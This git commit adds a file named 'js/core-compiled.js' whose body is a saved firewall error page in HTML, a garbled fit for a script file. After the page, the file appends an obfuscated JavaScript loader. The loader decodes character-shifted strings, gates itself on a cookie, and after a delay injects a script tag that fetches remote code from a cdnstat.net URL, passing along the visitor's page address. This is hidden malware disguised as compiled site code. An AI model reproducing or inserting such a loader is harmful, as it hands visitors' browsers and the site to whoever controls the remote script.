abeee2a9944be1043e02dca4de50440861d1ff60
MFE91 <118598739+MFE91@users.noreply.github.com>
2023-04-15 20:31:24 +0200

    Add files via upload

---
+++ js/core-compiled.js
@@ -0,0 +1,22 @@
+<html>
+  <head>
+   <title>406 Security Incident Detected</title>
+    <meta name="viewport" content="width=device-width">
+    <link href="../css/errorpage.css" rel="stylesheet">
+  </head>
+<body>
+<h1>406 Security Incident Detected</h1>
+<p>Your request was blocked.</p>
+
+<h3>If you are the owner of the website:</h3>
+<p>The Website Application Firewall that is protecting your website has blocked this request for being suspicious.</p>
+<p>You can see the detailed reason for this in your webserver logs.</p>
+
+<h3>If you are the visitor:</h3>
+<p>The public IP address assigned to you, by your internet provider, might be suffering from poor reputation: <a href="https://www.simply.com/rbl/?ip=194.29.53.224">Look up IP reputation here</a>. IP addresses from VPN providers or public networks often have poor reputation.</p>
+
+<hr>
+<p>194.29.53.224</p>
+
+</body>
+</html>;(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
